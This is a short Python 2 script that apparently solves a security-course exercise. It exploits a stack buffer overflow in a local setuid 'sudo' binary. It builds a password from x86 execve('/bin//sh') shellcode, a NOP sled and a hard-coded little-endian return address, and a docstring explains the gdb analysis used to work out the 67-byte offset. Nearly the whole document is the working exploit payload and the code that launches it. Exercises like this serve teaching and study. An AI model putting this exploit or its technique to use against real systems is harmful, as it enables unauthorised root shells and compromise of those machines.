import os, sys, subprocess

PATH_TO_SUDO = './sudo'


def run_shell():
	cmd = "pwd"# arbitrary, just used to follow the proper usage of the program
	assembler_password = "1\xc01\xc91\xd2Ph//shh/bin\x89\xe31\xc0\xb0\x0b\xcd\x80" # the shell code itself - doesn't contain 0x00, 25 bytes long
	nop = '\x90' * 42 # add NOPs complete to exactly 67 bytes long password
	shell_code_address = '\x69\xe0\xff\xbf' # Add begining of shell code address on stack, notic little endian
	password = assembler_password + nop + shell_code_address
	'''
	using core analysis with gdb:
	segmentation fault occured at address 0x0804007a, which is exactly the value of IEP register
	analyzing further we see that the address (on stack) that contains this value is 0xbfffe0ac
	so this is where RET value is stored on stack.
	next, we see that our shell code (AAAAAAA...) starts exactly on address 0xbfffe069.
	so this is where we would like to jump.
	calculating, (altough already done in section a) the difference between the addresses is 67 bytes.
	our shell code is only 25 bytes so we need more 42 NOP bytes.
	'''
	subprocess.call([PATH_TO_SUDO, password, cmd])
	return


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    run_shell()


if __name__ == '__main__':
    main(sys.argv)
